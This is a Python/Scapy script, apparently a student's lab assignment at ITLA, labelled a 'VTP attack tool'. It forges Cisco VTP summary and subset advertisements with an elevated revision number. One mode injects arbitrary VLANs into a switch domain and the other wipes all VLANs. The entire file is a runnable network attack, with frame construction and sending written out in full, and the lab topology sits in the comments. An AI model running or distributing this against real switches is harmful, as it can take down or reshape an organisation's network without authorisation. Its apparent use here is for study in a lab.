#!/usr/bin/env python3
# VTP ATTACK TOOL | Matricula: 2023-0316 | ITLA
# Topologia: Internet->Router(Fa0/0:20.23.3.1)->SW-L2->SW-CORE->SW-ACC-1/2
# SW-L2 Gig0/1:Kali(20.23.3.16) Gig0/2:Victima(20.23.3.50) Gig0/3:SW-CORE(20.23.3.2)
# Uso: sudo python3 vtp_attack.py -a agregar --vlans 100:VLAN-HACK
#      sudo python3 vtp_attack.py -a borrar

from scapy.all import *
import struct, argparse, sys, time, os

DOMINIO  = "LAB-2023-0316"
REVISION = 127
INTERFAZ = "eth0"
MAC_VTP  = "01:00:0c:cc:cc:cc"

def banner():
    print("VTP ATTACK TOOL | Matricula: 2023-0316 | ITLA")
    print("Topologia: Kali(Gig0/1) -> SW-L2(Gig0/3) -> SW-CORE -> SW-ACC-1/2")

def snap():
    return b"\xaa\xaa\x03\x00\x00\x0c\x20\x03"

def vtp_summary(dom, rev):
    d = dom.encode().ljust(32, b"\x00")[:32]
    return (b"\x01\x01\x01" + bytes([len(dom)]) + d +
            struct.pack(">I", rev) + b"\x14\x17\x03\x10" + b"\x00" * 28)

def vtp_subset(dom, rev, vlans):
    d = dom.encode().ljust(32, b"\x00")[:32]
    data = b""
    for v in vlans:
        n = v["name"].encode()
        p = (4 - len(n) % 4) % 4
        data += (bytes([12 + len(n) + p]) + b"\x00\x01" +
                 bytes([len(n)]) + struct.pack(">H", v["id"]) +
                 b"\x05\xdc" + struct.pack(">I", v["id"]) + n + b"\x00" * p)
    return b"\x01\x02\x01" + bytes([len(dom)]) + d + struct.pack(">I", rev) + data

def send_vtp(payload, iface, desc):
    frame = Ether(dst=MAC_VTP) / Raw(load=snap() + payload)
    print(f"[*] {desc}")
    sendp(frame, iface=iface, verbose=False)
    print("[+] OK")

def agregar(iface, dom, rev, vlans):
    print(f"\n[ATAQUE 1] Inyectando VLANs en '{dom}' rev={rev}")
    print("  Ruta: Kali eth0 -> SW-L2 Gig0/1 -> SW-L2 Gig0/3 -> SW-CORE -> SW-ACC-1/2")
    for v in vlans: print(f"  -> VLAN {v[\"id\"]}: {v[\"name\"]}")
    send_vtp(vtp_summary(dom, rev), iface, "VTP Summary Advertisement")
    time.sleep(0.5)
    send_vtp(vtp_subset(dom, rev, vlans), iface, "VTP Subset Advertisement")
    print("\n[OK] VLANs inyectadas. Verificar: show vlan brief")

def borrar(iface, dom, rev):
    print(f"\n[ATAQUE 2] Borrando TODAS las VLANs de '{dom}' rev={rev}")
    send_vtp(vtp_summary(dom, rev), iface, "VTP Summary Advertisement")
    time.sleep(0.5)
    send_vtp(vtp_subset(dom, rev, []), iface, "VTP Subset VACIO")
    print("\n[OK] VLANs eliminadas. Verificar: show vlan brief")

def main():
    banner()
    p = argparse.ArgumentParser(description="VTP Attack | 2023-0316 | ITLA")
    p.add_argument("-i", "--interfaz", default=INTERFAZ)
    p.add_argument("-d", "--dominio",  default=DOMINIO)
    p.add_argument("-r", "--revision", type=int, default=REVISION)
    p.add_argument("-a", "--accion",   choices=["agregar","borrar"], required=True)
    p.add_argument("--vlans", nargs="+", default=["100:VLAN-HACK"])
    a = p.parse_args()
    print(f"Config: interfaz={a.interfaz} dominio={a.dominio} rev={a.revision}\n")
    if a.accion == "agregar":
        vs = [{"id":int(v.split(":")[0]),"name":v.split(":")[1]} for v in a.vlans]
        agregar(a.interfaz, a.dominio, a.revision, vs)
    else:
        borrar(a.interfaz, a.dominio, a.revision)

if __name__ == "__main__":
    if os.geteuid() != 0: sys.exit("[!] sudo requerido")
    main()
